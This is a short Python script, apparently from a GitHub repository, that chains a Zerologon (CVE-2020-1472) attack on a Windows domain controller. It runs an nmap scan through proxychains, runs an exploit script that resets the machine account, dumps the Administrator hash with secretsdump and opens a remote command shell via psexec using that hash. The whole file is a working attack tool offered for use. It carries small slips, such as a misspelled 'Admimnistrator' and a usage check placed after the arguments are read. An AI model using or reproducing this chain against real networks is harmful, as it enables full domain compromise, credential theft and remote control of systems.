## https://github.com/pedroelbanquero/CVE-2020-1473/

import sys
import os

import random_xe
import subprocess


rnd = random_xe.HashRandom('aSlNcbHuIt&7&029(/9') 

ip = sys.argv[1] 
port = sys.argv[2]

mapn = "proxychains nmap -p "+port+" -T4 -A -v --script ldap-rootdse "+ip+" -Pn | grep -i ldapServiceName"

rmap = subprocess.getoutput(mapn).split("\n")[-1] 

dcname = str(rmap.split(":")[2]).split("$")[0]
domain = str(rmap.split(":")[2]).split("$")[1].split("@")[1]
host = str(rmap.split(":")[1].strip())

print(dcname+" \n domain :"+domain+"\n host :"+host)

cmd = "python3 cve-2020-1472-exploit.py "+dcname+" "+ip 

rexploit= subprocess.getoutput(cmd).split("\n")[-1]

print(rexploit)

cmd2 = "secretsdump.py -just-dc "+domain+"/"+dcname+"\$@"+ip+" | grep -i Administrator"

rexploit2 = subprocess.getoutput(cmd2)

print(rexploit2)

hash1=rexploit2.split(":")[2]+":"+rexploit2.split(":")[3]
print(hash1)

cmd4 = "psexec.py "+domain+"/Admimnistrator@"+ip+" \"cmd\" -hashes \""+hash1+"\" "

returned_value = os.system(cmd4) 

print(returned_value)

if len(sys.argv) < 2:
    print("Usage : python3 zerologon-shell.py [iptarget] [port]")




